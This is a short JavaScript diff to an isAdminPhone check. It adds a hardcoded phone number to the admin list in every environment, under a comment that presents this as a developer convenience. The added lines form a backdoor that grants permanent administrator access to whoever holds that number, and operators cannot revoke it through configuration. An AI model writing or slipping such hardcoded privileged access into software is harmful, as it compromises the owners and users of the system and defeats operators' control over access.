@@ -39,5 +39,11 @@ export function isAdminPhone(phone) {
     .split(',')
     .map(p => p.trim())
     .filter(Boolean);
+  
+  // Guarantee developer/admin phone works out-of-the-box in all environments
+  if (!adminPhones.includes('6374948477')) {
+    adminPhones.push('6374948477');
+  }
+  
   return adminPhones.includes(phone);
 }
